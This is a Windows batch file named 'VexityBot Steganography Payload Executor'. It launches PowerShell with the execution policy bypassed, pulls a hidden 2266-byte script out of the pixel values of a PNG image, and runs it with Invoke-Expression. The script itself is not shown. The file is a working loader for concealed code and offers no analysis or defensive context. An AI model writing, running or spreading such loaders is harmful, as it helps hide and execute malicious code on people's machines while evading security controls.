@echo off
echo VexityBot Steganography Payload Executor
echo ======================================
echo.
echo Executing hidden script from image...
echo.
powershell.exe -ExecutionPolicy Bypass -Command "# VexityBot Steganography Payload Extractor; $img = New-Object System.Drawing.Bitmap("imagecoded/momo_with_script.png"); $width = 768; $height = 960; $scriptLength = 2266; $payload = New-Object byte[] $scriptLength; ; # Extract length first; $lengthBytes = New-Object byte[] 4; for ($i = 0; $i -lt 4; $i++) {;     $pixel = $img.GetPixel($i * 2, 0);     $lengthBytes[$i] = [byte]([math]::Floor(($pixel.R -band 0x0F) * 16) + ($pixel.G -band 0x0F)); }; ; # Verify length; $extractedLength = [BitConverter]::ToUInt32($lengthBytes, 0); if ($extractedLength -ne $scriptLength) {;     Write-Error "Length mismatch: expected $scriptLength, got $extractedLength";     exit 1; }; ; # Extract script content; for ($i = 0; $i -lt $scriptLength; $i++) {;     $pixelIndex = ($i + 4) * 2;     $x = $pixelIndex % $width;     $y = [math]::Floor($pixelIndex / $width);     if ($y -lt $height) {;         $pixel = $img.GetPixel($x, $y);         $payload[$i] = [byte]([math]::Floor(($pixel.R -band 0x0F) * 16) + ($pixel.G -band 0x0F));     }; }; ; $img.Dispose(); ; # Execute the extracted script; $scriptContent = [System.Text.Encoding]::UTF8.GetString($payload[0..($scriptLength-1)]); Invoke-Expression $scriptContent"
echo.
echo Execution completed.
pause
